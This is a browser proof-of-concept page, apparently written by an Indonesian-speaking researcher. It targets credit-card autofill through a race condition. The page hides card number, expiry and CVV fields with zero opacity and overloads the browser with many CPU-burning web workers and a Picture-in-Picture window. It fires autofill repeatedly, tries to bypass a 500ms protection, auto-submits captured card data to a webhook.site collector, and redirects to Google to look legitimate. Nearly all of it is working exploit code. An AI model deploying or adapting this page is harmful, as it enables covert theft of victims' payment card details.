<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Race Condition PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
            height: 100vh;
            overflow: hidden;
        }
        
        .credit-card-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            position: relative;
            z-index: 10;
        }
        
        .credit-card-container h2 {
            margin-bottom: 20px;
            font-size: 24px;
            text-align: center;
        }
        
        .credit-card-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            position: relative;
            z-index: 20;
        }
        
        .credit-card-container input[type="submit"]:hover {
            background-color: #45a049;
        }
        
        #raceButton {
            width: 300px;
            padding: 15px;
            background-color: #ff4444;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            position: relative;
            z-index: 30;
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            background: #333;
            color: #fff;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            width: 300px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="credit-card-container">
        <h2>üí≥ Credit Card Form</h2>
        <form id="creditCardForm" action="https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3" method="POST">
            <!-- Hidden fields - tapi kita akan trigger autofill -->
            <input type="text" id="cardnumber" name="cardnumber" placeholder="Card Number" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:40px;">
            <input type="text" id="expiry" name="expiry" placeholder="Expiry (MM/YY)" style="opacity:0; position:absolute; top:50px; left:0; width:100%; height:40px;">
            <input type="text" id="cvv" name="cvv" placeholder="CVV" style="opacity:0; position:absolute; top:100px; left:0; width:100%; height:40px;">
            <input type="submit" value="Submit Payment">
        </form>
    </div>
    
    <!-- Tombol untuk memulai race condition -->
    <button id="raceButton">üî• START RACE CONDITION (1 CLICK) üî•</button>
    
    <div class="status" id="status">Ready. Click button to start race.</div>

    <script>
        let raceActive = false;
        let workers = [];
        let workerCount = 0;
        const statusDiv = document.getElementById('status');
        
        // Fungsi untuk membuat banyak workers
        function spawnWorkers(count) {
            for (let i = 0; i < count; i++) {
                try {
                    // Worker dengan kode minimal untuk membebani CPU
                    const worker = new Worker('data:application/javascript,' + 
                        encodeURIComponent(`
                            // Worker ${i} - heavy computation
                            let x = 0;
                            for(let j = 0; j < 1000000; j++) {
                                x += Math.random();
                            }
                            // Loop terus menerus
                            setInterval(() => {
                                let y = 0;
                                for(let k = 0; k < 100000; k++) {
                                    y += Math.sqrt(k);
                                }
                            }, 1);
                        `)
                    );
                    workers.push(worker);
                    workerCount++;
                } catch(e) {
                    console.log('Worker error:', e);
                }
            }
            statusDiv.innerHTML = `üß† Workers created: ${workerCount}`;
        }
        
        // Fungsi untuk memicu autofill dengan timing yang tepat
        function triggerAutofill() {
            // Fokus ke field cardnumber untuk memicu autofill
            document.getElementById('cardnumber').focus();
            
            // Simulasi klik pada opsi autofill (ini akan memicu bottom sheet)
            // Dalam skenario nyata, user akan melihat bottom sheet dan "klik"
            
            // Dispatch event untuk memicu autofill
            const event = new Event('input', { bubbles: true });
            document.getElementById('cardnumber').dispatchEvent(event);
            
            // Setelah autofill terisi, submit form
            setTimeout(() => {
                if(document.getElementById('cardnumber').value.length > 0) {
                    document.getElementById('creditCardForm').submit();
                    statusDiv.innerHTML = '‚úÖ FORM SUBMITTED!';
                } else {
                    statusDiv.innerHTML = '‚è≥ Autofill not triggered yet...';
                }
            }, 100);
        }
        
        // Fungsi utama race condition
        async function startRace() {
            if(raceActive) return;
            raceActive = true;
            
            statusDiv.innerHTML = 'üèÅ RACE STARTED!';
            
            // 1. Spawn banyak workers untuk membebani thread
            spawnWorkers(50);
            
            // 2. Buat interval untuk terus spawn workers
            const workerInterval = setInterval(() => {
                spawnWorkers(5);
            }, 10);
            
            // 3. Coba buka Picture-in-Picture window untuk tambahan load
            try {
                if ('documentPictureInPicture' in window) {
                    const pipWindow = await documentPictureInPicture.requestWindow({
                        width: 400,
                        height: 600
                    });
                    
                    // Isi dengan konten yang juga jalanin script berat
                    pipWindow.document.write(`
                        <html>
                            <body>
                                <script>
                                    setInterval(() => {
                                        for(let i=0; i<10000; i++) {
                                            Math.random();
                                        }
                                    }, 1);
                                <\/script>
                            </body>
                        </html>
                    `);
                }
            } catch(e) {
                console.log('PiP error:', e);
            }
            
            // 4. Loop cepat untuk trigger autofill berulang kali
            let attempts = 0;
            const autofillInterval = setInterval(() => {
                triggerAutofill();
                attempts++;
                statusDiv.innerHTML = `üéØ Attempt #${attempts} - Workers: ${workerCount}`;
                
                // Setelah 100 attempts, coba redirect
                if(attempts > 100) {
                    clearInterval(autofillInterval);
                    clearInterval(workerInterval);
                    
                    // Redirect ke Google biar keliatan legitimate
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                    
                    statusDiv.innerHTML = 'üèÅ RACE COMPLETE - Check webhook!';
                }
            }, 5); // Interval 5ms - sangat cepat
            
            // 5. Juga pakai requestAnimationFrame untuk timing presisi
            function rafLoop() {
                if(!raceActive) return;
                
                // Trigger tambahan di setiap frame
                document.getElementById('cardnumber').focus();
                
                if(attempts < 200) {
                    requestAnimationFrame(rafLoop);
                }
            }
            requestAnimationFrame(rafLoop);
            
            // 6. Multiple timers dengan berbagai delay
            for(let delay = 1; delay <= 20; delay++) {
                setTimeout(triggerAutofill, delay);
                setTimeout(triggerAutofill, delay + 500); // Coba bypass 500ms protection
            }
        }
        
        // Event listener untuk tombol race
        document.getElementById('raceButton').addEventListener('click', startRace);
        
        // Juga trigger race saat halaman di-load (untuk testing)
        // startRace(); // Uncomment untuk auto-start
        
        // Monitor input fields
        document.getElementById('cardnumber').addEventListener('input', function(e) {
            if(this.value.length > 0) {
                console.log('Card number detected:', this.value);
                statusDiv.innerHTML = 'üí≥ Card detected!';
            }
        });
        
        // Log untuk debugging
        console.log('Race Condition PoC Ready');
        console.log('Target: Credit Card Autofill');
        console.log('Webhook: https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3');
    </script>
</body>
</html>